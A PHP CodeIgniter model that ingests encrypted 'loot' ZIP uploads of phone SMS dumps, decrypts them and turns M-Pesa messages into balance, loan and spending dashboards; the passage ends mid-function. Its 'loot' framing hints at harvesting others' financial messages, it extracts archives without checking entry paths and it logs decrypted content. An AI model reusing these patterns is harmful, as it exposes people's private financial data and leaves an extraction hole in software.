<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Models\ModCryption;
use ZipArchive;

class ModUploads extends Model
{
    protected $table = "tbl_Loot";
    protected $primaryKey = "loot_Id";
    protected $allowedFields = [
        'loot_Name', 'loot_Device', 'loot_Owner', 'loot_Uuid', 'loot_Created'
    ];

    /**
     * Normalizes a date value (numeric or string) to Y-m-d H:i:s
     */
    private function normalizeDate($time): string {
        if (empty($time)) return date('Y-m-d H:i:s');
        if (is_numeric($time) && $time > 1000000000000) {
            $timestamp = (int)($time / 1000);
        } else {
            $timestamp = is_numeric($time) ? (int)$time : strtotime((string)$time);
        }
        return date('Y-m-d H:i:s', $timestamp ?: time());
    }

    // SMS pattern configuration with 'sms_' prefix
    protected $smsPatterns = [
        'sms_received' => "confirmed.you have received ksh",
        'sms_from_mshwari_account' => "transferred from m-shwari account on",
        'sms_from_ncba' => "from ncba bank on",
        'sms_from_kcb' => "from kcb",
        'sms_from_im_bank' => "from im bank limited- app on",
        'sms_balance_mpesa' => "confirmed. your account balance was",
        'sms_balance_kcb' => "confirmed. your kcb m-pesa",
        'sms_balance_mshwari' => "confirmed . your m-shwari deposit account",
        'sms_reversal' => "confirmed. reversal of transaction",
        'sms_loan_limit' => "confirmed. your loan limit is",
        'sms_sent' => "sent to",
        'sms_sent_to_lnm' => "paid to",
        'sms_sent_mini' => "confirmed. you have transfered ksh",
        'sms_sent_to_mshwari' => "transferred to m-shwari account on",
        'sms_sent_cancel' => "you have cancelled the transaction",
        'sms_error_failed' => "failed.",
        'sms_error_pin' => "you have entered the wrong pin",
        'sms_error_insufficient' => "insufficient funds in your",
        'sms_error_receiver' => "the number you are trying to pay has not joined the service",
        'sms_error_receiver_org' => "transaction failed, m-pesa cannot complete payment of",
        'sms_withdraw' => "confirmed.on",
        'sms_fuliza_opt_out' => "you have successfully opted out of fuliza m-pesa service.",
        'sms_fuliza_opt_in' => "you have successfully opted into fuliza m-pesa.",
        'sms_fuliza_limit' => "your fuliza m-pesa limit is ksh",
        'sms_fuliza_loan_paid' => "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa",
        'sms_fuliza_mini_statement' => "your fuliza m-pesa mini statement is as follows",
        'sms_fuliza_loan_taken' => "confirmed. fuliza m-pesa amount is",
        'sms_similar_transaction' => "m-pesa is unable to process your request because a similar transaction is currently underway",
        'sms_unknown' => "" // Default catch-all
    ];

    // ============ PUBLIC METHODS ============ //

    public function file_upload(array $data): bool {
        return $this->insert($data) ? true : false;
    }

    public function loot_zip_extract(string $zipFilePath): bool {
        $this->validate_zip_file($zipFilePath);

        $extractPath = WRITEPATH . 'uploads/txt_loot/';
        $this->ensure_directory_exists($extractPath);

        $zip = new ZipArchive();
        if ($zip->open($zipFilePath) !== TRUE) {
            throw new \RuntimeException("Failed to open ZIP file");
        }

        $zip->extractTo($extractPath);
        $zip->close();

        return true;
    }

    public function loot_last_uploaded(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Uuid')
            ->get();

        return $result->getResult()[0]->loot_Uuid ?? null;
    }

    public function loot_info(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_info_all(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_summary(string $loot_uuid): array {
        return $this->db->table('tbl_Loot_Summary')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_parse_sms(
        string $loot_uuid,
        string $loot_owner,
        string $loot_device,
        string $dated
    ): array {
        try {
            $this->db->transBegin();

            // 1. Validate and get loot file
            $lootFile = $this->validate_and_get_loot_file($loot_uuid);

            // 2. Load and decrypt content
            $decrypted = $this->decrypt_loot_file($lootFile['path']);

            // 3. Parse JSON data
            $smsData = $this->parse_sms_json($decrypted);

            // 4. Process messages
            $processed = $this->process_sms_messages(
                $smsData,
                $loot_uuid,
                $loot_owner,
                $loot_device
            );

            // 5. Save summary (throws on failure)
            $this->save_summary_data(
                $processed['counters'],
                $loot_uuid,
                $dated
            );

            if ($this->db->transStatus() === false) {
                throw new \RuntimeException('SMS processing transaction failed');
            }

            $this->db->transCommit();

            return [
                'status' => 'success',
                'processed' => $processed['inserted_count'],
                'summary' => $processed['counters']
            ];

        } catch (\Throwable $e) {
            $this->db->transRollback();
            log_message('error', 'SMS Processing Error: ' . $e->getMessage());
            // Re-throw so Upload::upload can return a proper error JSON to the client
            throw $e;
        }
    }

    public function file_listing(string $loot_owner, string $loot_device): array {
        return $this->db->table($this->table)
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get()
            ->getResult();
    }

    public function device_check_print(array $print_dump): array {
        return $this->db->table('tbl_Devices')
            ->select('device_Uuid')
            ->where($print_dump)
            ->get()
            ->getResult();
    }

    /**
     * Find an existing device by stable fingerprint fields (not the per-request UUID).
     */
    public function device_find_by_fingerprint(
        string $fingerprint,
        string $model = '',
        string $brand = ''
    ): array {
        $builder = $this->db->table('tbl_Devices')->select('device_Uuid');

        if ($fingerprint !== '') {
            $builder->where('device_Fingerprint', $fingerprint);
        } else {
            // Fallback when fingerprint is empty (rare / custom ROMs)
            $builder->where('device_Model', $model)
                ->where('device_Brand', $brand);
        }

        return $builder->limit(1)->get()->getResult();
    }

    public function get_loot_uuid(string $loot_name): string {
        $result = $this->db->table($this->table)
            ->select('loot_Uuid')
            ->where('loot_Name', $loot_name)
            ->get()
            ->getResult();

        return $result[0]->loot_Uuid ?? '';
    }

    public function get_loot_summary_from_uuids(array $loot_array_uuids): array {
        return $this->db->table('tbl_Loot_Summary')
            ->select('*')
            ->whereIn('loot_Uuid', $loot_array_uuids)
            ->get()
            ->getResult();
    }

    public function device_make_print(array $print_dump): bool {
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }

    public function ensureUserDevicesTable()
    {
        $db = \Config\Database::connect();
        if (!$db->tableExists('tbl_User_Devices')) {
            $forge = \Config\Database::forge();
            $forge->addField([
                'id' => ['type' => 'INT', 'constraint' => 11, 'unsigned' => true, 'auto_increment' => true],
                'user_id' => ['type' => 'INT', 'constraint' => 11, 'unsigned' => true],
                'device_token' => ['type' => 'VARCHAR', 'constraint' => 255],
                'device_name' => ['type' => 'VARCHAR', 'constraint' => 100, 'null' => true],
                'created_at' => ['type' => 'DATETIME', 'null' => true],
            ]);
            $forge->addKey('id', true);
            $forge->addKey('user_id');
            $forge->addKey('device_token');
            $forge->createTable('tbl_User_Devices');
        }
    }

    public function getLinkedDevices(int $userId): array
    {
        $this->ensureUserDevicesTable();
        return $this->db->table('tbl_User_Devices')->where('user_id', $userId)->get()->getResult();
    }

    public function linkDevice(int $userId, string $deviceToken, string $deviceName): bool
    {
        $this->ensureUserDevicesTable();
        // Check if already linked
        $exists = $this->db->table('tbl_User_Devices')
            ->where(['user_id' => $userId, 'device_token' => $deviceToken])
            ->countAllResults();
            
        if ($exists > 0) return true;
        
        return $this->db->table('tbl_User_Devices')->insert([
            'user_id' => $userId,
            'device_token' => $deviceToken,
            'device_name' => $deviceName,
            'created_at' => date('Y-m-d H:i:s')
        ]);
    }

    /**
     * Finds the date of the absolute last upload
     */
    public function getLastUploadDate(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Created')
            ->get()
            ->getRow();
        return $result ? $this->normalizeDate($result->loot_Created) : null;
    }

    /**
     * Get the date of the very last transaction in the database
     */
    public function getLatestTransactionDate(): ?string {
        $result = $this->db->table('tbl_Sms')
            ->selectMax('sms_time')
            ->get()
            ->getRow();
        return $result ? $this->normalizeDate($result->sms_time) : null;
    }

    /**
     * Get aggregated metrics for the dashboard within 30 days of last upload
     */
    public function getDashboardMetrics30Days(string $lastDate, ?string $deviceToken = null): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        // Try Analyzed data first (use all-time if data is available)
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $builder = $this->db->table('tbl_Analyzed_Transactions a')
                ->selectSum('a.amount', 'total_amount')
                ->select('a.description');
                
            if ($deviceToken) {
                $builder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                        ->where('s.sms_owner', $deviceToken);
            }
            
            $analyzed = $builder->groupBy('a.description')->get()->getResult();
            
            if (!empty($analyzed)) {
                $stats = [
                    'current_balance' => 0,
                    'fuliza_balance' => 0,
                    'total_sent_30' => 0,
                    'total_received_30' => 0,
                    'withdrawn_30' => 0,
                    'fuliza_taken_30' => 0,
                    'is_analyzed' => true
                ];
                foreach ($analyzed as $row) {
                    $desc = strtolower($row->description);
                    if ($desc === 'received') $stats['total_received_30'] = (float)$row->total_amount;
                    elseif (in_array($desc, ['sent', 'sent to lnm'])) $stats['total_sent_30'] += (float)$row->total_amount;
                    elseif ($desc === 'withdraw') $stats['withdrawn_30'] = (float)$row->total_amount;
                    elseif ($desc === 'fuliza loan taken') $stats['fuliza_taken_30'] = (float)$row->total_amount;
                }
                
                // Average daily spend and max transaction
                $stats['daily_avg_spend'] = $stats['total_sent_30'] / 30;
                
                $maxBuilder = $this->db->table('tbl_Analyzed_Transactions a')
                    ->selectMax('a.amount', 'amount')
                    ->whereIn('a.description', ['Sent', 'Sent To Lnm']);
                if ($deviceToken) {
                    $maxBuilder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                               ->where('s.sms_owner', $deviceToken);
                }
                $maxTrans = $maxBuilder->get()->getRow();
                $stats['max_transaction'] = (float)($maxTrans->amount ?? 0);

                // Still need latest balance from raw SMS
                $smsBuilder = $this->db->table('tbl_Sms')
                    ->orderBy('sms_time', 'DESC')
                    ->limit(100);
                if ($deviceToken) {
                    $smsBuilder->where('sms_owner', $deviceToken);
                }
                $latestSms = $smsBuilder->get()->getResult();
                foreach ($latestSms as $sms) {
                    $body = strtolower(base64_decode($sms->sms_body));
                    if ($stats['current_balance'] == 0 && strpos($body, 'new m-pesa balance is ksh') !== false) {
                        $stats['current_balance'] = $this->extractBalance($body);
                    }
                    if ($stats['fuliza_balance'] == 0 && strpos($body, 'fuliza m-pesa limit is ksh') !== false) {
                        $stats['fuliza_balance'] = $this->extractBalance($body);
                    }
                    if ($stats['current_balance'] > 0 && $stats['fuliza_balance'] > 0) break;
                }
                return $stats;
            }
        }

        $stats = [
            'current_balance' => 0,
            'fuliza_balance' => 0,
            'total_sent_30' => 0,
            'total_received_30' => 0,
            'withdrawn_30' => 0,
            'fuliza_taken_30' => 0,
            'is_analyzed' => false
        ];

        $smsBuilder = $this->db->table('tbl_Sms');
        if ($deviceToken) $smsBuilder->where('sms_owner', $deviceToken);
        $smsList = $smsBuilder->get()->getResult();
        
        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            $cat = strtolower($sms->sms_category);
            
            if ($cat === 'received') {
                $stats['total_received_30'] += $amount;
            } elseif (in_array($cat, ['sent', 'sent to lnm'])) {
                $stats['total_sent_30'] += $amount;
            } elseif ($cat === 'withdraw') {
                $stats['withdrawn_30'] += $amount;
            } elseif ($cat === 'fuliza loan taken') {
                $stats['fuliza_taken_30'] += $amount;
            }
            if (strpos($body, 'new m-pesa balance is ksh') !== false) {
                $stats['current_balance'] = $this->extractBalance($body);
            }
            if (strpos($body, 'fuliza m-pesa limit is ksh') !== false) {
                $stats['fuliza_balance'] = $this->extractBalance($body);
            }
        }

        return $stats;
    }

    /**
     * Detailed Sent Summary (30 days)
     */
    public function getSentSummary30Days(string $lastDate, ?string $deviceToken = null): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $data = [
                'paybill' => 0,
                'till' => 0,
                'sent_mobile' => 0,
                'fuliza_deductions' => 0
            ];
            
            $builder = $this->db->table('tbl_Analyzed_Transactions a')
                ->select('a.amount, a.description, s.sms_body')
                ->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                ->whereIn('a.description', ['Sent', 'Sent To Lnm', 'Fuliza Loan Paid']);
                
            if ($deviceToken) {
                $builder->where('s.sms_owner', $deviceToken);
            }
                
            $analyzed = $builder->get()->getResult();
            
            if (!empty($analyzed)) {
                foreach ($analyzed as $row) {
                    $body = strtolower(base64_decode($row->sms_body));
                    $amount = (float)$row->amount;
                    if ($row->description === 'Sent To Lnm') {
                        if (strpos($body, 'paybill') !== false) $data['paybill'] += $amount;
                        else $data['till'] += $amount;
                    } elseif ($row->description === 'Sent') {
                        $data['sent_mobile'] += $amount;
                    } elseif ($row->description === 'Fuliza Loan Paid') {
                        $data['fuliza_deductions'] += $amount;
                    }
                }
                return $data;
            }
        }

        $data = [
            'paybill' => 0,
            'till' => 0,
            'sent_mobile' => 0,
            'fuliza_deductions' => 0
        ];

        $smsBuilder = $this->db->table('tbl_Sms')
            ->where('sms_time >=', $thirtyDaysAgo)
            ->where('sms_time <=', $lastDate);
            
        if ($deviceToken) {
            $smsBuilder->where('sms_owner', $deviceToken);
        }
        
        $smsList = $smsBuilder->get()->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            if ($sms->sms_category === 'Sent To Lnm') {
                if (strpos($body, 'paybill') !== false) $data['paybill'] += $amount;
                else $data['till'] += $amount;
            } elseif ($sms->sms_category === 'Sent') {
                $data['sent_mobile'] += $amount;
            } elseif ($sms->sms_category === 'Fuliza Loan Paid') {
                $data['fuliza_deductions'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Detailed Received Summary (30 days)
     */
    public function getReceivedSummary30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $data = [
                'total' => 0,
                'banks' => 0,
                'mshwari_kcb' => 0
            ];
            
            $analyzed = $this->db->table('tbl_Analyzed_Transactions a')
                ->select('a.amount, a.description, s.sms_body')
                ->join('tbl_Sms s', 's.sms__id = a.orig_sms_id')
                ->where('a.trans_date >=', $thirtyDaysAgo)
                ->where('a.trans_date <=', $lastDate)
                ->whereIn('a.description', ['Received', 'From Mshwari Account', 'From Kcb'])
                ->get()
                ->getResult();
            
            if (!empty($analyzed)) {
                foreach ($analyzed as $row) {
                    $body = strtolower(base64_decode($row->sms_body));
                    $amount = (float)$row->amount;
                    if ($row->description === 'Received') {
                        $data['total'] += $amount;
                        if (strpos($body, 'bank') !== false) $data['banks'] += $amount;
                    } elseif (in_array($row->description, ['From Mshwari Account', 'From Kcb'])) {
                        $data['mshwari_kcb'] += $amount;
                        $data['total'] += $amount;
                    }
                }
                return $data;
            }
        }

        $data = [
            'total' => 0,
            'banks' => 0,
            'mshwari_kcb' => 0
        ];

        $smsList = $this->db->table('tbl_Sms')
            ->where('sms_time >=', $thirtyDaysAgo)
            ->where('sms_time <=', $lastDate)
            ->get()
            ->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            if ($sms->sms_category === 'Received') {
                $data['total'] += $amount;
                if (strpos($body, 'bank') !== false) $data['banks'] += $amount;
            } elseif (in_array($sms->sms_category, ['From Mshwari Account', 'From Kcb'])) {
                $data['mshwari_kcb'] += $amount;
                $data['total'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Fetch recent transactions
     */
    public function getRecentTransactions(int $limit = 10, ?string $deviceToken = null): array {
        $builder = $this->db->table('tbl_Sms s')
            ->select('s.*, a.trans_id as analyzed_id, a.counterparty as analyzed_counterparty, a.amount as analyzed_amount')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left')
            ->orderBy('s.sms_time', 'DESC')
            ->limit($limit);
            
        if ($deviceToken) {
            $builder->where('s.sms_owner', $deviceToken);
        }
        
        return $builder->get()->getResult();
    }

    /**
     * Advanced Filtering — handles numeric sms_time and base64 bodies
     */
    public function getFilteredTransactions(array $f, int $limit = 500, int $offset = 0): array {
        $builder = $this->db->table('tbl_Sms s')
            ->select('s.*, a.trans_id as analyzed_id, a.counterparty as analyzed_counterparty, a.amount as analyzed_amount')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left');

        // Category filter — safe SQL filter
        if (!empty($f['category'])) {
            $builder->where('s.sms_category', $f['category']);
        }

        // Keyword search in number or analyzed fields (body search done in PHP below)
        if (!empty($f['search'])) {
            $builder->groupStart()
                ->like('s.sms_number', $f['search'])
                ->orLike('a.trans_id', $f['search'])
                ->orLike('a.counterparty', $f['search'])
                ->groupEnd();
        }

        $builder->limit(5000, $offset); // Fetch generous amount for PHP filters
        $results = $builder->orderBy('s.sms_time', 'DESC')->get()->getResult();

        // Post-process all filters in PHP (handles numeric timestamps and base64 bodies)
        $filtered = [];
        $dateFrom = !empty($f['date_from']) ? strtotime($f['date_from'] . ' 00:00:00') : null;
        $dateTo   = !empty($f['date_to'])   ? strtotime($f['date_to'] . ' 23:59:59')   : null;

        foreach ($results as $sms) {
            // Normalize the timestamp
            $ts = is_numeric($sms->sms_time) && $sms->sms_time > 1000000000000
                ? (int)($sms->sms_time / 1000)
                : (is_numeric($sms->sms_time) ? (int)$sms->sms_time : strtotime($sms->sms_time));

            // Date range filter
            if ($dateFrom !== null && $ts < $dateFrom) continue;
            if ($dateTo   !== null && $ts > $dateTo)   continue;

            // Body keyword search (decoded)
            if (!empty($f['search'])) {
                $body = strtolower(base64_decode($sms->sms_body));
                $needle = strtolower($f['search']);
                if (strpos($body, $needle) === false &&
                    stripos($sms->sms_number, $f['search']) === false &&
                    stripos($sms->analyzed_id ?? '', $f['search']) === false &&
                    stripos($sms->analyzed_counterparty ?? '', $f['search']) === false) {
                    continue;
                }
            }

            // Amount filter
            if (!empty($f['min_amount']) || !empty($f['max_amount'])) {
                $amt = (float)($sms->analyzed_amount ?? $this->extractAmount(base64_decode($sms->sms_body)));
                if (!empty($f['min_amount']) && $amt < (float)$f['min_amount']) continue;
                if (!empty($f['max_amount']) && $amt > (float)$f['max_amount']) continue;
            }

            $filtered[] = $sms;
            if (count($filtered) >= $limit) break;
        }

        return $filtered;
    }

    /**
     * Get data for charts (30 day window, with graceful fallback to all-time)
     */
    public function getAnalyticsData30Days(string $lastDate, ?string $deviceToken = null): array {
        // Step 1: Try to build data from tbl_Analyzed_Transactions within window
        $thirtyDaysAgo = date('Y-m-d', strtotime($lastDate . ' -29 days'));

        // Check if there is any analyzed data at all
        $hasAnalyzed = false;
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $count = $this->db->table('tbl_Analyzed_Transactions')->countAllResults();
            $hasAnalyzed = $count > 0;
        }

        // If we have analyzed data, use it. Otherwise fall back to raw SMS.
        $labels    = [];
        $spending  = [];
        $receiving = [];

        for ($i = 29; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime($lastDate . " -$i days"));
            $labels[] = date('d M', strtotime($date));

            $daySpending  = 0;
            $dayReceiving = 0;

            if ($hasAnalyzed) {
                $builder = $this->db->table('tbl_Analyzed_Transactions a')
                    ->selectSum('a.amount', 'total_amount')
                    ->select('a.description')
                    ->where("DATE(a.trans_date)", $date);
                    
                if ($deviceToken) {
                    $builder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                            ->where('s.sms_owner', $deviceToken);
                }
                    
                $daily = $builder->groupBy('a.description')->get()->getResult();

                foreach ($daily as $row) {
                    $desc = strtolower($row->description);
                    if ($desc === 'received') $dayReceiving += (float)$row->total_amount;
                    elseif (in_array($desc, ['sent', 'sent to lnm'])) $daySpending += (float)$row->total_amount;
                }
            } else {
                $smsBuilder = $this->db->table('tbl_Sms')->like('sms_time', $date);
                if ($deviceToken) $smsBuilder->where('sms_owner', $deviceToken);
                $smsList = $smsBuilder->get()->getResult();

                foreach ($smsList as $sms) {
                    $amount = $this->extractAmount(base64_decode($sms->sms_body));
                    $cat = strtolower($sms->sms_category);
                    if ($cat === 'received') $dayReceiving += $amount;
                    elseif (in_array($cat, ['sent', 'sent to lnm'])) $daySpending += $amount;
                }
            }

            $spending[]  = $daySpending;
            $receiving[] = $dayReceiving;
        }

        // If the 30-day window is completely empty, try to find oldest/newest dates from SMS
        $allEmpty = (array_sum($spending) + array_sum($receiving)) === 0;
        if ($allEmpty) {
            // Rebuild using all SMS data regardless of date
            $labels   = [];
            $spending = $receiving = [];
            
            $allBuilder = $this->db->table('tbl_Sms')
                ->select('sms_time, sms_category, sms_body')
                ->orderBy('sms_time', 'ASC');
                
            if ($deviceToken) $allBuilder->where('sms_owner', $deviceToken);
            $allSms = $allBuilder->get()->getResult();

            // Group by date
            $byDate = [];
            foreach ($allSms as $sms) {
                $d = $this->normalizeDate($sms->sms_time);
                $dateKey = substr($d, 0, 10);
                $byDate[$dateKey][] = $sms;
            }

            // Take last 30 date keys
            $dateKeys = array_keys($byDate);
            $slice = array_slice($dateKeys, -30);

            foreach ($slice as $dateKey) {
                $labels[] = date('d M', strtotime($dateKey));
                $daySpending = 0; $dayReceiving = 0;
                foreach ($byDate[$dateKey] as $sms) {
                    $amount = $this->extractAmount(base64_decode($sms->sms_body));
                    $cat = strtolower($sms->sms_category);
                    if ($cat === 'received') $dayReceiving += $amount;
                    elseif (in_array($cat, ['sent', 'sent to lnm'])) $daySpending += $amount;
                }
                $spending[]  = $daySpending;
                $receiving[] = $dayReceiving;
            }
        }

        $categories = ['Paybill' => 0, 'Till' => 0, 'Sent to Mobile' => 0, 'Withdrawal' => 0];

        if ($hasAnalyzed) {
            $catBuilder = $this->db->table('tbl_Analyzed_Transactions a')
                ->select('a.amount, a.description, s.sms_body')
                ->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left');
                
            if ($deviceToken) $catBuilder->where('s.sms_owner', $deviceToken);
            $catData = $catBuilder->get()->getResult();

            foreach ($catData as $row) {
                $body = strtolower(base64_decode($row->sms_body ?? ''));
                $amt  = (float)$row->amount;
                $desc = strtolower($row->description);
                if ($desc === 'sent to lnm') {
                    if (strpos($body, 'paybill') !== false) $categories['Paybill'] += $amt;
                    else $categories['Till'] += $amt;
                } elseif ($desc === 'sent') {
                    $categories['Sent to Mobile'] += $amt;
                } elseif ($desc === 'withdraw') {
                    $categories['Withdrawal'] += $amt;
                }
            }
        } else {
            $smsListBuilder = $this->db->table('tbl_Sms');
            if ($deviceToken) $smsListBuilder->where('sms_owner', $deviceToken);
            $smsList = $smsListBuilder->get()->getResult();
            foreach ($smsList as $sms) {
                $body = strtolower(base64_decode($sms->sms_body));
                $amt  = $this->extractAmount($body);
                $cat  = strtolower($sms->sms_category);
                if ($cat === 'sent to lnm') {
                    if (strpos($body, 'paybill') !== false) $categories['Paybill'] += $amt;
                    else $categories['Till'] += $amt;
                } elseif ($cat === 'sent') {
                    $categories['Sent to Mobile'] += $amt;
                } elseif ($cat === 'withdraw') {
                    $categories['Withdrawal'] += $amt;
                }
            }
        }

        // Fuliza (from raw SMS, since it's a category not usually in analyzed)
        $fulizaTaken = array_fill(0, count($labels), 0);
        $fulizaPaid  = array_fill(0, count($labels), 0);
        
        $fulizaBuilder = $this->db->table('tbl_Sms')
            ->whereIn('sms_category', ['Fuliza Loan Taken', 'Fuliza Loan Paid']);
        if ($deviceToken) $fulizaBuilder->where('sms_owner', $deviceToken);
        $allFulizaSms = $fulizaBuilder->get()->getResult();

        foreach ($allFulizaSms as $sms) {
            $d = substr($this->normalizeDate($sms->sms_time), 0, 10);
            $idx = array_search(date('d M', strtotime($d)), $labels);
            if ($idx !== false) {
                $amount = $this->extractAmount(base64_decode($sms->sms_body));
                $cat = strtolower($sms->sms_category);
                if ($cat === 'fuliza loan taken') $fulizaTaken[$idx] += $amount;
                elseif ($cat === 'fuliza loan paid') $fulizaPaid[$idx] += $amount;
            }
        }

        return [
            'labels'       => $labels,
            'spending'     => $spending,
            'receiving'    => $receiving,
            'categories'   => $categories,
            'fuliza_taken' => $fulizaTaken,
            'fuliza_paid'  => $fulizaPaid,
        ];
    }

    /**
     * Helper to extract amount from SMS body
     */
    private function extractAmount(string $body): float {
        // Match "Ksh 1,200.00" or "Ksh. 1200"
        if (preg_match('/ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    /**
     * Helper to extract balance from SMS body
     */
    private function extractBalance(string $body): float {
        if (preg_match('/balance is ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    // ============ PROTECTED METHODS ============ //

    protected function clean_sms_by_trimming_messages(array $smsMessages): array {
        $cleanedMessages = [];
        $transactionTerm = "transaction cost";

        foreach ($smsMessages as $sms) {
            $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
            if ($number !== 'MPESA' && !str_contains($number, 'MPESA')) {
                continue;
            }

            $message = strtolower(base64_decode((string) ($sms->Body ?? '')));
            $position = strpos($message, $transactionTerm);

            $cleanedMessages[] = base64_encode(
                $position !== false
                    ? substr($message, 0, $position)
                    : $message
            );
        }

        return $cleanedMessages;
    }

    protected function clean_sms_by_categorizing(array $smsMessages): array {
        $categories = [];
        $counters = array_fill_keys(array_keys($this->smsPatterns), 0);

        foreach ($smsMessages as $message) {
            $decoded = base64_decode($message);
            $category = 'sms_unknown';

            foreach ($this->smsPatterns as $name => $pattern) {
                if (!empty($pattern) && strpos($decoded, $pattern) !== false) {
                    $category = $name;
                    break;
                }
            }

            $counters[$category]++;
            $categories[] = ucwords(str_replace(['sms_', '_'], ['', ' '], $category));
        }

        return [
            'categories' => $categories,
            'counters' => $counters
        ];
    }

    protected function clean_sms_by_returning_column(array $smsMessages, string $columnName): array {
        $columnData = [];
        $property = $columnName === 'Thread Id' ? 'Thread Id' : $columnName;

        foreach ($smsMessages as $sms) {
            if ($sms->Number === "MPESA") {
                $columnData[] = $sms->$property;
            }
        }

        return $columnData;
    }

    protected function validate_zip_file(string $path): void {
        if (!file_exists($path)) {
            throw new \RuntimeException("ZIP file not found");
        }

        if (mime_content_type($path) !== 'application/zip') {
            throw new \RuntimeException("Invalid file type");
        }
    }

    protected function ensure_directory_exists(string $path): void {
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
        }
    }

    protected function validate_and_get_loot_file(string $uuid): array {
        $query = $this->db->table($this->table)
            ->select('loot_Name')
            ->where('loot_Uuid', $uuid)
            ->get();

        if ($query->getNumRows() === 0) {
            throw new \RuntimeException("Loot record not found");
        }

        $fileName = $query->getRow()->loot_Name;
        $filePath = WRITEPATH . "uploads/txt_loot/" . $fileName;

        if (!file_exists($filePath)) {
            throw new \RuntimeException("Loot file not found");
        }

        return [
            'name' => $fileName,
            'path' => $filePath
        ];
    }

    protected function decrypt_loot_file(string $path): string {
        $modCryption = new ModCryption();
        $content = file_get_contents($path);
        
        log_message('debug', 'File path: ' . $path);
        log_message('debug', 'File size: ' . filesize($path));
        log_message('debug', 'File content first 32 bytes: ' . bin2hex(substr($content, 0, 32)));
        
        $decrypted = $modCryption->decode_content($content);

        if (empty($decrypted)) {
            throw new \RuntimeException("Failed to decrypt file");
        }

        log_message('debug', 'Decrypted content length: ' . strlen($decrypted));
        log_message('debug', 'Decrypted content first 200 chars: ' . substr($decrypted, 0, 200));

        return $decrypted;
    }

    protected function parse_sms_json(string $data): array {
        $transformations = [
            '-------(//)--------' => '',
            "\n" => '****',
            '****"' => '"'
        ];

        $normalized = str_replace(
            array_keys($transformations),
            array_values($transformations),
            $data
        );

        $json = json_decode('[' . substr($normalized, 0, -2) . '}]');

        if (json_last_error() !== JSON_ERROR_NONE) {
            log_message('error', 'JSON parse error: ' . json_last_error_msg());
            log_message('debug', 'Normalized data first 500 chars: ' . substr($normalized, 0, 500));
            throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
        }

        return $json;
    }

    protected function process_sms_messages(
        array $smsData,
        string $uuid,
        string $owner,
        string $device
    ): array {
        // Build MPESA-only list so body/category indexes stay aligned
        $mpesaMessages = [];
        foreach ($smsData as $sms) {
            $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
            if ($number === 'MPESA' || str_contains($number, 'MPESA')) {
                $mpesaMessages[] = $sms;
            }
        }

        $cleaned = $this->clean_sms_by_trimming_messages($mpesaMessages);
        $categorized = $this->clean_sms_by_categorizing($cleaned);

        $batch = [];
        foreach ($mpesaMessages as $index => $sms) {
            $batch[] = [
                'sms_type' => $sms->Type ?? '',
                'sms_number' => $sms->Number ?? 'MPESA',
                'sms_thread_id' => $sms->{'Thread Id'} ?? '',
                'sms_time' => $sms->Date ?? '',
                'sms_category' => $categorized['categories'][$index] ?? 'Unknown',
                'sms_seen' => $sms->Seen ?? '',
                'sms__id' => $sms->ID ?? '',
                'sms_body' => $cleaned[$index] ?? '',
                'sms_loot_source' => $uuid,
                'sms_owner' => $owner,
                'sms_device' => $device
            ];
        }

        $inserted = 0;
        foreach (array_chunk($batch, 100) as $chunk) {
            if ($this->db->table('tbl_Sms')->ignore(true)->insertBatch($chunk)) {
                $inserted += count($chunk);
            }
        }

        return [
            'inserted_count' => $inserted,
            'counters' => $categorized['counters']
        ];
    }

    /**
     * Map pattern keys from $smsPatterns → DB summary columns.
     * Keys must match $this->smsPatterns exactly.
     */
    protected function save_summary_data(array $counters, string $uuid, int|string $date): bool {
        $mapping = [
            'sms_received'              => 'info_Get_from_MPESA',
            'sms_from_mshwari_account'  => 'info_Get_from_Mshwari',
